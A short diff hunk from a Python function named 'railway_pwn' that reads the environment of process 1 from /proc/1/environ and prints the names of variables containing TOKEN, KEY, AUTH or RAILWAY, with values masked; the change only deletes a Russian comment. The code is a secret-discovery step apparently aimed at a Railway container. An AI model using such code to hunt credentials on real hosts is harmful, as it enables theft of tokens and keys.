@@ -16,7 +16,7 @@ def railway_pwn():
     try:
         with open('/proc/1/environ', 'rb') as f:
             env_data = f.read().replace(b'\0', b'\n').decode()
-            # Ищем только чувствительные ключи, чтобы отчет был чистым
+            
             for line in env_data.split('\n'):
                 if any(k in line.upper() for k in ['TOKEN', 'KEY', 'AUTH', 'RAILWAY']):
                     print(f"[FOUND SECRET]: {line.split('=')[0]}=******")
